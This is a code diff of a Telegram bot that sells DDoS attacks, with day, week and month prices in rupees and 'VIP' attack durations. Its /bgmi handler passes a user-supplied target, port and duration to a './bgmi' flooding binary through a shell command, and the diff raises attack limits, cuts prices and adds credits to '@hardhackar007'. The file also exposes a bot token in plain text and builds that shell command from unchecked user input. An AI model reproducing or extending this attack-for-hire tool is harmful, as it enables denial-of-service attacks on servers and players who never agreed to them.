@@ -10,7 +10,7 @@ import os
 bot = telebot.TeleBot('7343477389:AAEL3rdXEVk9F1O1twhwtTsPdlEL72qrzKg')
 
 # Admin user IDs
-admin_id = ["6829567767", "5679673719", "6975923843", ""]
+admin_id = ["6829567767", "1705593541", "", ""]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -102,7 +102,7 @@ def add_user(message):
         else:
             response = "Please specify a user ID to add 😒."
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "Only Admin Can Run This Command LAST WARNING 😡."
 
     bot.reply_to(message, response)
 
@@ -127,7 +127,7 @@ def remove_user(message):
             response = '''Please Specify A User ID to Remove. 
 ✅ Usage: /remove <userid>'''
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "Only Admin Can Run This Command Last warning 😡."
 
     bot.reply_to(message, response)
 
@@ -207,7 +207,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, LAST WARNING 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
+    response = f"{username}, LAST WARNING 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI Provide by @hardhackar007"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -243,9 +243,9 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = f"BGMI Attack Finished.@hardhackar007 Target: {target} Port: {port} Port: {time}"
         else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            response = "kya karta hai bhai 🤣✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
         response = "❌ You Are Not Authorized To Use This Command ❌."
 
@@ -300,7 +300,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''LAST WARNING ⚠️ 👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
+    response = f''' Programmer https://amalgamative-prereq.000webhostapp.com/Programmer.html ⚠️ 👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
 🤖Try To Run This Command : /help 
 WELCOME @hardhackar007 TO THE SERVER FREEZE BOT'''
     bot.reply_to(message, response)
@@ -321,14 +321,14 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
--> Attack Time : 200 (S)
-> After Attack Limit : 3 Min
+-> Attack Time : 980 tak last (S)
+> After Attack Limit : no limit 
 -> Concurrents Attack : 300
 
 Pr-ice List💸 :
 Day-->300 Rs
-Week-->1200 Rs
-Month-->2500 Rs
+Week-->1000Rs
+Month-->2000 Rs
 '''
     bot.reply_to(message, response)
 
